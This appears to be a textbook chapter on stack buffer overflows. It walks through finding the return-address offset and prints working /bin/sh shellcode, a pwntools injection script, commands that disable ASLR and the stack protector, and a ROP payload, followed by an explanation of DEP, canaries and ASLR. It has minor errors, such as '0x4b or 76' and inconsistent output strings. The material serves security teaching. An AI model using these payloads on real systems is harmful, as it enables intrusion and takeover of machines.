# Chapter 1. Stack Smashing
In this chapter, we discuss the most common and easy-to-understand memory-safety problems: stack buffer overflow. An attacker could leverage such bugs to modity the stack and achieve malicious goals, knowning as stack smashing. We will not dive into the technical details of exploit writting (there are many such tutorials and tools available online, e.g., for CTF training) but mainly discuss why such bugs are dangerous and show how attacks could happen in practice. 

## Section 1.1 Stack Smashing

### 1.1.1 Warm Up
Let's use the following code snippet as a toy example, which contains a validation process that requires the user to input a key to pass the validation. The code contains a buffer overflow bug because the length of buf is 64 while it may read 160 byte data. Supposing the user neither know a valid key nor can obtain the source code. How can he find a key to pass the validation? 

```
int validation() {
    char buf[64];
    read(STDIN_FILENO, buf, 160);
    if(buf[0]=='$'){ //any code to check the input
        write(STDOUT_FILENO, "Key verified!\n", 14);
        return 1;
    }else{
    	write(STDOUT_FILENO, "Wrong key!\n", 11);
    }
    return 0;
}
```
The trick lies in the stack layout, and we can obtain the layout by analyzing its assembly code.
```
0x401150 <+0>:     push   %rbp
0x401151 <+1>:     mov    %rsp,%rbp
0x401154 <+4>:     sub    $0x50,%rsp
0x401158 <+8>:     xor    %edi,%edi
0x40115a <+10>:    lea    -0x50(%rbp),%rsi
0x40115e <+14>:    mov    $0xa0,%edx
0x401163 <+19>:    callq  0x401050 <read@plt>
0x401168 <+24>:    movsbl -0x50(%rbp),%ecx
0x40116c <+28>:    cmp    $0x24,%ecx
0x40116f <+31>:    jne    0x40119a <+74>
0x401175 <+37>:    mov    $0x1,%edi
0x40117a <+42>:    movabs $0x402004,%rsi
0x401184 <+52>:    mov    $0xe,%edx
0x401189 <+57>:    callq  0x401030 <write@plt>
0x40118e <+62>:    movl   $0x1,-0x4(%rbp)
0x401195 <+69>:    jmpq   0x4011ba <+106>
0x40119a <+74>:    mov    $0x1,%edi
0x40119f <+79>:    movabs $0x402013,%rsi
0x4011a9 <+89>:    mov    $0xb,%edx
0x4011ae <+94>:    callq  0x401030 <write@plt>
0x4011b3 <+99>:    movl   $0x0,-0x4(%rbp)
0x4011ba <+106>:   mov    -0x4(%rbp),%eax
0x4011bd <+109>:   add    $0x50,%rsp
0x4011c1 <+113>:   pop    %rbp
0x4011c2 <+114>:   retq
```
![image](./figures/chapt1-stack-main.png)

Let's assume the our porpose is to enforce the function to return 1, so we can trace the data flow of the return value backwards. Starting from Line <+106>, we know the return value of the register (%eax) is moved from the stack -0x4(%rbp). Line <+99> saves 0x0 to -0x4(%rbp), while Line <+62> saves 0x1 to -0x4(%rbp). So we can tamper the buffer of -0x4(%rbp) to bypass the validation. Line <+4> tells us the assembly code increases the stack size with 0x50. We can compute the offset of -0x4(%rbp) to the register %rsp should be 0x4b or 76 in decimal. In order to let the function return 1, we can input a 76-byte buf with the last four bytes to be 1.

### 1.1.2 Stack Smashing
A stack smashing attack contains three major steps:
- Step 1. Detect buffer overflow bugs or find an input that can crash a program. This is usually done via fuzz testing. 
- Step 2. Analyze stack layout of the buggy code. In practice, attackers may not be able to obtain the executables. 
- Step 3. Design the exploit. To obtain the shell. e.g., with return-oriented programming.

Now, we discuss a more general senario, i.e., 1) the attacker cannot obtain the binaries, and 2) his goal is to obtain the shell. 

#### 1.1.2.1 Stack Layout Analysis
The purpose is to obtain the offset of the return address so that we can point it to the another code address, e.g., shell code. Let's still use our previous toy program for demonstration. The idea is to input several 'A's (hexdecimal ASCII: 0X41). If it has changed the return addresses, then the program will not be able to continue the execution and report the bad return address. We can gradually increase the length of the input to learn the offset of the return address. 

|                |
|:--------------:|
| previous frame |
|   ret address  |
|       ...      |
|    AAAAAAAA    |

Before experiments, we need to turn on the core dump message
```
#: ulimit -c unlimited
#: sudo sysctl -w kernel.core_pattern=core
```

Input several 'A's and check the core dump message.
```
#: python -c 'print "A"*92'
#:./bug 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA…
Wrong license!
Segmentation fault (core dumped)

#: gdb --core core 
...
Program received signal SIGSEGV, Segmentation fault.
0x0000000a41414141 in ?? ()
```
The log message displays a segmentation fault caused by a invalid return address 0x0000000a41414141. Because there are four 'A's, we can know the offset of the return address should be 92-4=88. Note that if you try more a 'A's, the error message may not be 0x0000414141414141 but another different address because 0x0000414141414141 is an invalid code address to the OS.

#### 1.1.2.2 Design the Exploit 
The following code is a shellcode snippts for x86_64, which executes system("/bin/sh"). 
```
xor eax, eax
mov 0xFF978CD091969DD1, rbx
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov 0x3b, al
syscall
```

We can test if the shellcode works via the following code. It first encodes and saves the shellcode as a char array, and then jumps to it as a function call.
```
const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main (void) {
  char buf[256];
  int len = sizeof(shellcode);
  for(int i=0; i<len; i++)
	 buf[i] = shellcode[i]; 
  ((void (*) (void)) buf) ();
}
```

If it works, we can inject the shellcode to the vulnerable program.
```
#! /usr/bin/env python
from pwn import *

ret = 0x7fffffffe1d0
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = shellcode + "A" * (88-len(shellcode)) + p64(ret)
p = process("./bug")
p.send(payload)
p.interactive()
```

Execute the attacking code. If you are lucky enough, you should be able to obtain the following result.
```
#: python hijack.py 
[+] Starting local process './bug': pid 48788
[*] Switching to interactive mode
Input your key:Wrong key!
$ whoami
hui
$ 
```

If not, it possibly means you are using the stack protector or the ASLR. Turn off the stack protector when compiling the buggy program to eable the data on the stack to be executable.
```
#: clang -fno-stack-protector -z execstack bug.c
```

You can also turn off the ASLR as following.
```
#: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## Section 2. Protection Techniques
To prevent smashing attackes, we may either try to avoid buffer overflow bugs or to increase the difficulty of attacks. To avoid buffer overflow bugs, a widely employd technique during programming is fat pointer. Note that it is generally difficult to detect buffer overflow vulnerabilities during compiling time because whether a pointer points to an out-of-bound address is undecidable. The fat pointer contains additional size information which enables the problem to perform runtime boundary check. We leave the detailed discussion of such programming techniques to later chapters. 

The attack and protection techniques coevolve.

Attack: Stack Smashing 
=> Defense: Data Execution Prevention
===> Attack: Return-oriented Programming
=====> Defense ：ASLR, Stack Canary
=======> Attack ：Side Channel 
=========> Defense ：Shadown Stack 
===========> ...

### 1.2.1 DEP 
DEP is a technique that disable the stack data from being executed. It achieves the purpose by setting the flag of the stack to RW instead of RWE.
```
#: readelf -l bug
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset     VirtAddr           PhysAddr    FileSiz   MemSiz      Flags  Align
  PHDR           0x...00040 0x...00400040 0x...00400040   0x...001f8 0x...001f8  R E    8
  INTERP         0x...00238 0x...00400238 0x...00400238   0x...0001c 0x...0001c  R      1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x...00000 0x...00400000 0x...00400000   0x...00864 0x...00864  R E    200000
  LOAD           0x...00e10 0x...00600e10 0x...00600e10   0x...00230 0x...00238  RW     200000
  DYNAMIC        0x...00e28 0x...00600e28 0x...00600e28   0x...001d0 0x...001d0  RW     8
  NOTE           0x...00254 0x...00400254 0x...00400254   0x...00044 0x...00044  R      4
  GNU_EH_FRAME   0x...00710 0x...00400710 0x...00400710   0x...0003c 0x...0003c  R      4
  GNU_STACK      0x...00000 0x...00000000 0x...00000000   0x...00000 0x...00000  RWE    10
  GNU_RELRO      0x...00e10 0x...00600e10 0x...00600e10   0x...001f0 0x...001f0  R      1
```

### 1.2.2 RoP Attack
If DEP is enabled, we cannot inject shellcode directly on the stack. The idea of RoP is to use existing codes to achieve the same sematics. For example, we may change the return address to the system function. As long as we can set the patameter to "/bin/sh" before that, we should be able to execute system("/bin/sh") and obtain the shell. 

The following figure demonstrates the mechanism of an RoP attack. We first change the return address to some gaddet code that allow us to assign the parameter value to "/bin/sh". According to the calling convention of x86_64, the first parameter is saved in the rdi register. Therefore, some instructions containing "pop rdi" might be useful as our gadget. In our example, after "pop rdi", the "ret" instruction will use the data on top of the stack as the return address. We set the address to the function entry of system().

![image](./figures/chapt1-rop.png)

```
#: clang -fno-stack-protector bug.c -o bug
#: gdb bug
(gdb) break *validation
Breakpoint 1 at 0x401150
(gdb) r
Starting program: bug 
Input your key:
Breakpoint 1, 0x0000000000401150 in validation ()
(gdb) print system
$1 = {<text variable, no debug info>} 0x7ffff7e18410 <__libc_system>
(gdb) find 0x7ffff7e18410, +2000000, "/bin/sh"
0x7ffff7f7a5aa
```
```
#: ldd bug
        linux-vdso.so.1 (0x00007ffff7fcd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc3000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)
```
```
#: ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
0x00000000000276e9 : pop rdi ; pop rbp ; ret
0x0000000000026b72 : pop rdi ; ret
0x00000000000e926d : pop rdi ; ret 0xfff3
```

```
system_addr = 0x7ffff7e18410
binsh_addr = 0x7ffff7f7a5aa

libc = ELF('libc.so.6')
ret_offset = 0x0000000000026b72 - libc.symbols['system']
ret_addr = system_addr + ret_offset

payload = "A" * 88 + p64(ret_addr) + p64(binsh_addr) + p64(system_addr) 
```

### 1.2.3 Stack Canary 
Stack canary is a widely used technique to check the stack integrity with a sentinel. Developers can enable stack canary with an option -fstack-protector when compiling their code. The generated assembly code is shown as following.

```
push   %rbp
mov    %rsp,%rbp
sub    $0x80,%rsp
xor    %edi,%edi
mov    $0x64,%eax
mov    %eax,%edx
lea    -0x50(%rbp),%rsi
mov    %fs:0x28,%rcx
mov    %rcx,-0x8(%rbp)
…
mov    %fs:0x28,%rcx
cmp    -0x8(%rbp),%rcx
mov    %eax,-0x74(%rbp)
jne    0x400691 <validation+177>
mov    -0x74(%rbp),%eax
add    $0x80,%rsp
pop    %rbp
retq   
callq  0x4004a0 <__stack_chk_fail@plt>
```

In the assembly code, fs:0x28 stores the sentinel stack-guard value. The code moves the value to -0x8(%rbp) and finally compare it with the original value when the function returns. 
|                |
|:--------------:|
| previous frame |
|   ret address  |
|    old rbp     |
|    canary      |
|                |


### 1.2.4 ASLR
ASLR randomizes memory allocations to make memory addresses harder to predict. The technique is implemented by the kernel and the ELF loader. In general, there are three levels of ASLR:
- Stack ASLR: each execution results in a different stack address.
- Mmap ASLR: each execution results in a different memory map.
- Exec ASLR: the program is loaded into a different memory location in each each execution. This is also known as position-independent executables.

To set the levels of ASLR, use the following command.
```
#: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```




